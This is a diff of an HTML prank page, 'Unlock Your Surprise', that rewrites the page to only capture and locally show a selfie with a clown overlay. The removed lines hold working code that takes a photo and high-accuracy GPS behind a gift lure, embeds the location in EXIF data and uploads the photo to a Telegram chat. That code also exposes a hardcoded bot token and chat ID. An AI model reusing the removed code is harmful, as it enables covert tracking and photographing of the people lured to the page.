@@ -1,510 +1,456 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Unlock Your Surprise 🎁</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Unlock Your Surprise 🎁</title>
 
-<script src="https://cdn.jsdelivr.net/npm/piexifjs@1.0.6/piexif.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-<style>
-*{box-sizing:border-box}
+    body {
+      margin: 0;
+      min-height: 100vh;
+      padding: 22px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(145deg, #fff0f6, #fbd7ec, #f1d9ff);
+      font-family: Arial, sans-serif;
+      color: #783b60;
+    }
 
-body{
-  margin:0;
-  min-height:100vh;
-  padding:22px 16px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  background:linear-gradient(145deg,#fff0f6,#fbd7ec,#f1d9ff);
-  font-family:Arial,sans-serif;
-  color:#783b60;
-}
+    .app {
+      width: 100%;
+      max-width: 390px;
+      padding: 25px 20px;
+      background: #ffffffd9;
+      border: 1px solid white;
+      border-radius: 28px;
+      text-align: center;
+      box-shadow: 0 15px 45px #c77ba533;
+    }
 
-.app{
-  width:100%;
-  max-width:390px;
-  padding:25px 20px;
-  background:#ffffffd9;
-  border:1px solid white;
-  border-radius:28px;
-  text-align:center;
-  box-shadow:0 15px 45px #c77ba533;
-}
+    h1 {
+      color: #d94d91;
+      font-size: 28px;
+      margin: 0 0 8px;
+    }
 
-h1{
-  color:#d94d91;
-  font-size:28px;
-  margin:0 0 8px;
-}
+    .subtitle {
+      color: #9c6c88;
+      font-size: 14px;
+      margin: 0 0 22px;
+    }
 
-.subtitle{
-  color:#9c6c88;
-  font-size:14px;
-  margin:0 0 22px;
-}
+    .frame {
+      position: relative;
+      width: min(78vw, 290px);
+      aspect-ratio: 1;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      overflow: hidden;
+      background: #f8d8e9;
+      border: 6px solid white;
+      outline: 2px solid #f0a3ca;
+      box-shadow: 0 8px 24px #c96ba333;
+      transition: width .3s ease;
+    }
 
-/* Original decorative circle size */
-.frame{
-  width:min(78vw,290px);
-  aspect-ratio:1;
-  margin:0 auto 20px;
-  border-radius:50%;
-  overflow:hidden;
-  background:#f8d8e9;
-  border:6px solid white;
-  outline:2px solid #f0a3ca;
-  box-shadow:0 8px 24px #c96ba333;
-  transition:width .3s ease;
-}
+    .frame.camera-open {
+      width: min(45vw, 150px);
+    }
 
-/* Smaller circle only when camera opens */
-.frame.camera-open{
-  width:min(15vw,50px);
-}
+    video,
+    .preview {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
 
-video,.preview{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-}
+    .placeholder {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 12px;
+      padding: 24px;
+      color: #b34e87;
+    }
 
-.placeholder{
-  height:100%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-  gap:12px;
-  padding:24px;
-  color:#b34e87;
-}
+    .heart {
+      font-size: 54px;
+    }
 
-.heart{font-size:54px}
+    .joker {
+      position: absolute;
+      inset: 0;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 54px;
+      pointer-events: none;
+      animation: pop .35s ease-out;
+    }
 
-button{
-  width:100%;
-  padding:14px;
-  margin:6px 0;
-  border:0;
-  border-radius:30px;
-  background:#ed72ac;
-  color:white;
-  font-weight:bold;
-  font-size:15px;
-  cursor:pointer;
-}
+    button {
+      width: 100%;
+      padding: 14px;
+      margin: 6px 0;
+      border: 0;
+      border-radius: 30px;
+      background: #ed72ac;
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+    }
 
-button:disabled{
-  opacity:.5;
-  cursor:wait;
-}
+    button:disabled {
+      opacity: .5;
+      cursor: wait;
+    }
 
-.notice{
-  text-align:left;
-  font-size:12px;
-  line-height:1.5;
-  padding:12px;
-  background:#fff0f7;
-  border-radius:14px;
-  margin:14px 0;
-}
+    .notice {
+      text-align: left;
+      font-size: 12px;
+      line-height: 1.5;
+      padding: 12px;
+      background: #fff0f7;
+      border-radius: 14px;
+      margin: 14px 0;
+    }
 
-.consent{
-  display:flex;
-  align-items:flex-start;
-  gap:9px;
-  text-align:left;
-  font-size:12px;
-  line-height:1.5;
-  margin:12px 2px;
-}
+    .consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 9px;
+      text-align: left;
+      font-size: 12px;
+      line-height: 1.5;
+      margin: 12px 2px;
+    }
 
-.consent input{
-  margin-top:3px;
-  accent-color:#dc5597;
-}
+    .consent input {
+      margin-top: 3px;
+      accent-color: #dc5597;
+    }
 
-.status{
-  min-height:38px;
-  margin-top:12px;
-  font-size:13px;
-  line-height:1.5;
-  overflow-wrap:anywhere;
-}
+    .status {
+      min-height: 38px;
+      margin-top: 12px;
+      font-size: 13px;
+      line-height: 1.5;
+      overflow-wrap: anywhere;
+    }
 
-.tiny{
-  font-size:11px;
-  color:#a17b94;
-  line-height:1.5;
-}
+    .tiny {
+      font-size: 11px;
+      color: #a17b94;
+      line-height: 1.5;
+    }
 
-[hidden]{display:none!important}
+    [hidden] {
+      display: none !important;
+    }
 
-.prank-popup{
-  position:fixed;
-  inset:0;
-  z-index:9999;
-  background:#2c0a20bb;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  padding:22px;
-}
+    .prank-popup {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: #2c0a20bb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 22px;
+    }
 
-.prank-card{
-  width:100%;
-  max-width:330px;
-  padding:28px 22px;
-  border-radius:28px;
-  background:#fff4fa;
-  color:#a12d70;
-  text-align:center;
-  box-shadow:0 15px 50px #0004;
-  animation:pop .35s ease-out;
-}
+    .prank-card {
+      width: 100%;
+      max-width: 330px;
+      padding: 28px 22px;
+      border-radius: 28px;
+      background: #fff4fa;
+      color: #a12d70;
+      text-align: center;
+      box-shadow: 0 15px 50px #0004;
+      animation: pop .35s ease-out;
+    }
 
-.prank-card h2{
-  font-size:34px;
-  margin:12px 0;
-}
+    .prank-card h2 {
+      font-size: 34px;
+      margin: 12px 0;
+    }
 
-.prank-card p{line-height:1.5}
+    .prank-card p {
+      line-height: 1.5;
+    }
 
-@keyframes pop{
-  from{transform:scale(.65) rotate(-5deg);opacity:0}
-  to{transform:scale(1) rotate(0);opacity:1}
-}
-</style>
+    @keyframes pop {
+      from {
+        transform: scale(.65) rotate(-5deg);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1) rotate(0);
+        opacity: 1;
+      }
+    }
+  </style>
 </head>
 
 <body>
+  <main class="app">
+    <h1>🎁 Unlock Your Surprise!</h1>
+    <p class="subtitle">
+      A little surprise is waiting for you 👀💗
+    </p>
 
-<main class="app">
-  <h1>🎁 Unlock Your Surprise!</h1>
-  <p class="subtitle">A little surprise is waiting for you 👀💗</p>
+    <div class="frame" id="cameraFrame">
+      <video id="camera" autoplay playsinline hidden></video>
+      <img id="preview" class="preview"
+           alt="Your captured photo" hidden>
 
-  <div class="frame" id="cameraFrame">
-    <video id="camera" autoplay playsinline hidden></video>
-    <img id="preview" class="preview" alt="Captured photo" hidden>
+      <div id="placeholder" class="placeholder">
+        <span class="heart" id="heartEmoji">🎀</span>
+        <span id="placeholderText">Your surprise awaits...</span>
+      </div>
 
-    <div id="placeholder" class="placeholder">
-      <span class="heart">🎀</span>
-      <span>Your surprise awaits...</span>
+      <div id="jokerEmoji" class="joker" hidden>🤡</div>
+    </div>
+
+    <div class="notice">
+      📸 Your camera will open after you agree. A photo will be
+      captured and displayed on this page. You can download it
+      yourself. This version does not transmit your photo or GPS.
+    </div>
+
+    <label class="consent">
+      <input type="checkbox" id="consent">
+      <span>
+        I understand that the camera will be used to capture a photo
+        for display on this page.
+      </span>
+    </label>
+
+    <button id="startBtn" disabled>
+      🎁 Unlock Your Surprise
+    </button>
+
+    <button id="downloadBtn" hidden>
+      📥 Download My Photo
+    </button>
+
+    <div id="status" class="status" role="status" aria-live="polite">
+      Agree to begin.
+    </div>
+
+    <p class="tiny">Ready for a little chaos? 😂 ♡</p>
+  </main>
+
+  <div id="prankPopup" class="prank-popup" hidden>
+    <div class="prank-card">
+      <div style="font-size:54px">😂🤡</div>
+      <h2>GOTCHA!</h2>
+      <p>You just got fooled! 🤣</p>
+      <p>The real surprise was the prank all along 💗</p>
+      <button id="closePrank">HAHA, OK! 😂</button>
     </div>
   </div>
 
-  <div class="notice">
-    📸 Tapping the button opens your camera, captures a photo, and sends
-    it with your device's reported location to the configured Telegram chat.
-  </div>
+  <script>
+    "use strict";
 
-  <label class="consent">
-    <input type="checkbox" id="consent">
-    <span>I understand and agree that my photo and GPS coordinates will
-    be sent to Telegram when I tap the surprise button.</span>
-  </label>
+    const $ = id => document.getElementById(id);
 
-  <button id="startBtn" disabled>🎁 Unlock Your Surprise</button>
+    const camera = $("camera");
+    const preview = $("preview");
+    const placeholder = $("placeholder");
+    const heartEmoji = $("heartEmoji");
+    const placeholderText = $("placeholderText");
+    const jokerEmoji = $("jokerEmoji");
+    const consent = $("consent");
+    const startBtn = $("startBtn");
+    const downloadBtn = $("downloadBtn");
+    const statusBox = $("status");
+    const prankPopup = $("prankPopup");
+    const closePrank = $("closePrank");
+    const cameraFrame = $("cameraFrame");
 
-  <div id="status" class="status" role="status">
-    Agree to the photo and location sharing notice to begin.
-  </div>
+    let stream = null;
+    let photoUrl = null;
+    let busy = false;
 
-  <p class="tiny">Ready for a little chaos? 😂 ♡</p>
-</main>
-
-<div id="prankPopup" class="prank-popup" hidden>
-  <div class="prank-card">
-    <div style="font-size:54px">😂🤡</div>
-    <h2>GOTCHA!</h2>
-    <p>You just got fooled! 🤣</p>
-    <p>The real surprise was the prank all along 💗</p>
-    <button id="closePrank">HAHA, OK! 😂</button>
-  </div>
-</div>
-
-<script>
-"use strict";
-
-// Telegram configuration
-// A token in public JavaScript can be copied by anyone.
-const BOT_TOKEN = "8799702650:AAH4KcrkJaFVVxlEAA6JkoepemAv2PRx_ZM";
-const CHAT_ID = "7350437667";
-
-const $ = id => document.getElementById(id);
-
-const camera = $("camera");
-const preview = $("preview");
-const placeholder = $("placeholder");
-const consent = $("consent");
-const startBtn = $("startBtn");
-const statusBox = $("status");
-const prankPopup = $("prankPopup");
-const cameraFrame = $("cameraFrame");
-
-let stream = null;
-let imageCapture = null;
-let previewUrl = null;
-let busy = false;
-
-function setStatus(message){
-  statusBox.textContent = message;
-}
-
-function stopCamera(){
-  if(stream){
-    stream.getTracks().forEach(track => track.stop());
-    stream = null;
-  }
-
-  imageCapture = null;
-  camera.srcObject = null;
-}
-
-function clearPreview(){
-  if(previewUrl){
-    URL.revokeObjectURL(previewUrl);
-    previewUrl = null;
-  }
-
-  preview.removeAttribute("src");
-  preview.hidden = true;
-}
-
-consent.addEventListener("change",()=>{
-  startBtn.disabled = !consent.checked || busy;
-});
-
-async function openCamera(){
-  if(!navigator.mediaDevices?.getUserMedia){
-    throw new Error("Open this website over HTTPS in Chrome.");
-  }
-
-  setStatus("Opening camera... 📸");
-
-  stream = await navigator.mediaDevices.getUserMedia({
-    audio:false,
-    video:{
-      facingMode:{ideal:"environment"},
-      width:{ideal:4096},
-      height:{ideal:3072}
-    }
-  });
-
-  camera.srcObject = stream;
-  camera.hidden = false;
-
-  // Shrink the circle only when the camera opens.
-  cameraFrame.classList.add("camera-open");
-
-  placeholder.hidden = true;
-  await camera.play();
-
-  const track = stream.getVideoTracks()[0];
-
-  if(!("ImageCapture" in window)){
-    throw new Error(
-      "Automatic still-photo capture is unsupported. Try Chrome on Android."
-    );
-  }
-
-  imageCapture = new ImageCapture(track);
-}
-
-function getLocation(){
-  return new Promise((resolve,reject)=>{
-    if(!navigator.geolocation){
-      reject(new Error("Location access is unavailable."));
-      return;
+    function setStatus(message) {
+      statusBox.textContent = message;
     }
 
-    navigator.geolocation.getCurrentPosition(
-      p=>resolve({
-        lat:p.coords.latitude,
-        lon:p.coords.longitude,
-        accuracy:p.coords.accuracy,
-        time:p.timestamp
-      }),
-      e=>reject(new Error(
-        e.code===1
-          ? "Location permission denied. Allow location and retry."
-          : e.code===3
-          ? "Location timed out. Please retry."
-          : "Could not obtain your location."
-      )),
-      {
-        enableHighAccuracy:true,
-        timeout:30000,
-        maximumAge:0
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
       }
-    );
-  });
-}
+      camera.srcObject = null;
+    }
 
-async function addGpsExif(blob,loc){
-  if(!window.piexif){
-    throw new Error("EXIF library failed to load. Refresh the page.");
-  }
+    function resetVisuals() {
+      stopCamera();
 
-  if(blob.type && blob.type.toLowerCase()!=="image/jpeg"){
-    throw new Error("Camera did not return JPEG; cannot add GPS EXIF.");
-  }
+      camera.hidden = true;
+      preview.hidden = true;
+      placeholder.hidden = false;
+      heartEmoji.hidden = false;
+      placeholderText.hidden = false;
+      jokerEmoji.hidden = true;
+      cameraFrame.classList.remove("camera-open");
+    }
 
-  const bytes = new Uint8Array(await blob.arrayBuffer());
+    consent.addEventListener("change", () => {
+      startBtn.disabled = !consent.checked || busy;
+    });
 
-  if(bytes[0]!==255 || bytes[1]!==216){
-    throw new Error("The captured image is not a valid JPEG.");
-  }
+    async function openCamera() {
+      if (!navigator.mediaDevices?.getUserMedia) {
+        throw new Error(
+          "Camera access requires HTTPS or localhost in a supported browser."
+        );
+      }
 
-  let binary = "";
+      setStatus("Opening camera... 📸");
 
-  for(let i=0;i<bytes.length;i+=32768){
-    binary += String.fromCharCode(...bytes.subarray(i,i+32768));
-  }
+      stream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: {
+          facingMode: { ideal: "user" }
+        }
+      });
 
-  let exif;
+      camera.srcObject = stream;
+      camera.hidden = false;
 
-  try{
-    exif = piexif.load(binary);
-  }catch(_){
-    exif = {
-      "0th":{},
-      "Exif":{},
-      "GPS":{},
-      "1st":{},
-      "thumbnail":null
-    };
-  }
+      cameraFrame.classList.add("camera-open");
 
-  exif["GPS"] = exif["GPS"] || {};
-  const gps = exif["GPS"];
+      heartEmoji.hidden = true;
+      placeholderText.hidden = true;
+      placeholder.hidden = true;
 
-  gps[piexif.GPSIFD.GPSVersionID] = [2,3,0,0];
-  gps[piexif.GPSIFD.GPSLatitudeRef] = loc.lat<0 ? "S" : "N";
-  gps[piexif.GPSIFD.GPSLatitude] =
-    piexif.GPSHelper.degToDmsRational(Math.abs(loc.lat));
+      // Show the joker over the center of the live camera.
+      jokerEmoji.hidden = false;
 
-  gps[piexif.GPSIFD.GPSLongitudeRef] = loc.lon<0 ? "W" : "E";
-  gps[piexif.GPSIFD.GPSLongitude] =
-    piexif.GPSHelper.degToDmsRational(Math.abs(loc.lon));
+      await camera.play();
 
-  if(Number.isFinite(loc.accuracy)){
-    gps[piexif.GPSIFD.GPSHPositioningError] = [
-      Math.round(loc.accuracy*100),100
-    ];
-  }
+      // Wait briefly so the video has a usable frame.
+      await new Promise(resolve => {
+        if (camera.readyState >= 2) {
+          resolve();
+        } else {
+          camera.addEventListener("loadeddata", resolve, {
+            once: true
+          });
+        }
+      });
+    }
 
-  const date = new Date(loc.time);
+    function capturePhoto() {
+      if (!camera.videoWidth || !camera.videoHeight) {
+        throw new Error("Camera is not ready. Please try again.");
+      }
 
-  gps[piexif.GPSIFD.GPSDateStamp] =
-    date.toISOString().slice(0,10).replace(/-/g,":");
+      const canvas = document.createElement("canvas");
+      canvas.width = camera.videoWidth;
+      canvas.height = camera.videoHeight;
 
-  gps[piexif.GPSIFD.GPSTimeStamp] = [
-    [date.getUTCHours(),1],
-    [date.getUTCMinutes(),1],
-    [date.getUTCSeconds(),1]
-  ];
+      const context = canvas.getContext("2d");
+      context.drawImage(camera, 0, 0);
 
-  const inserted = piexif.insert(piexif.dump(exif),binary);
-  const output = new Uint8Array(inserted.length);
+      return new Promise((resolve, reject) => {
+        canvas.toBlob(blob => {
+          if (blob) resolve(blob);
+          else reject(new Error("Could not create the photo."));
+        }, "image/jpeg", 0.92);
+      });
+    }
 
-  for(let i=0;i<inserted.length;i++){
-    output[i] = inserted.charCodeAt(i);
-  }
+    async function captureAndShow() {
+      setStatus("Capturing your photo... 📸");
 
-  return new Blob([output],{type:"image/jpeg"});
-}
+      const photo = await capturePhoto();
 
-async function sendToTelegram(blob){
-  if(
-    BOT_TOKEN==="YOUR_TELEGRAM_BOT_TOKEN" ||
-    CHAT_ID==="YOUR_CHAT_ID"
-  ){
-    throw new Error("Configure your Telegram bot token and chat ID.");
-  }
+      if (photoUrl) {
+        URL.revokeObjectURL(photoUrl);
+      }
 
-  const form = new FormData();
+      photoUrl = URL.createObjectURL(photo);
 
-  form.append("chat_id",CHAT_ID);
-  form.append("document",blob,`surprise-${Date.now()}.jpg`);
+      preview.src = photoUrl;
+      preview.hidden = false;
 
-  const response = await fetch(
-    `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
-    {method:"POST",body:form}
-  );
+      camera.hidden = true;
+      jokerEmoji.hidden = true;
+      placeholder.hidden = true;
 
-  const result = await response.json();
+      stopCamera();
 
-  if(!response.ok || !result.ok){
-    throw new Error(result.description || "Telegram upload failed.");
-  }
-}
+      downloadBtn.hidden = false;
 
-async function captureAndSend(){
-  setStatus("Getting location... 📍");
-  const loc = await getLocation();
+      // The popup stays open until the user dismisses it.
+      prankPopup.hidden = false;
+      closePrank.disabled = false;
+      setStatus("Photo captured successfully! 😂💗");
+    }
 
-  if(!imageCapture){
-    throw new Error("Camera capture is not ready.");
-  }
+    startBtn.addEventListener("click", async () => {
+      if (!consent.checked || busy) return;
 
-  setStatus("Capturing your surprise... 📸");
-  const rawPhoto = await imageCapture.takePhoto();
+      busy = true;
+      startBtn.disabled = true;
 
-  setStatus("Adding GPS metadata... ♡");
-  const photo = await addGpsExif(rawPhoto,loc);
+      try {
+        await openCamera();
 
-  clearPreview();
+        // Keep the joker visible briefly before capturing.
+        await new Promise(resolve => setTimeout(resolve, 900));
 
-  previewUrl = URL.createObjectURL(photo);
-  preview.src = previewUrl;
-  preview.hidden = false;
-  camera.hidden = true;
-  placeholder.hidden = true;
+        await captureAndShow();
+      } catch (error) {
+        resetVisuals();
+        setStatus(error.message || "Could not complete the surprise.");
+      } finally {
+        busy = false;
+        startBtn.disabled = !consent.checked;
+      }
+    });
 
-  stopCamera();
+    downloadBtn.addEventListener("click", () => {
+      if (!photoUrl) return;
 
-  // Show prank immediately after capture and metadata processing.
-  prankPopup.hidden = false;
-  setStatus("Surprise captured! Sending to Telegram... ♡");
+      const link = document.createElement("a");
+      link.href = photoUrl;
+      link.download = "my-surprise-photo.jpg";
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
 
-  await sendToTelegram(photo);
-  setStatus("Prank delivered! Photo sent successfully 😂💗");
-}
+      setStatus("Your photo download was requested. 💗");
+    });
 
-startBtn.addEventListener("click",async()=>{
-  if(!consent.checked || busy) return;
+    closePrank.addEventListener("click", () => {
+      if (busy) return;
+      prankPopup.hidden = true;
+    });
 
-  busy = true;
-  startBtn.disabled = true;
+    window.addEventListener("pagehide", () => {
+      stopCamera();
 
-  try{
-    await openCamera();
-    await captureAndSend();
-  }catch(error){
-    stopCamera();
-    camera.hidden = true;
-    placeholder.hidden = false;
-
-    // Restore the original large decorative circle on failure.
-    cameraFrame.classList.remove("camera-open");
-
-    startBtn.hidden = false;
-    setStatus(error.message || "Could not complete the surprise.");
-  }finally{
-    busy = false;
-    startBtn.disabled = !consent.checked;
-  }
-});
-
-$("closePrank").addEventListener("click",()=>{
-  prankPopup.hidden = true;
-});
-
-window.addEventListener("pagehide",stopCamera);
-</script>
+      if (photoUrl) {
+        URL.revokeObjectURL(photoUrl);
+        photoUrl = null;
+      }
+    });
+  </script>
 </body>
 </html>
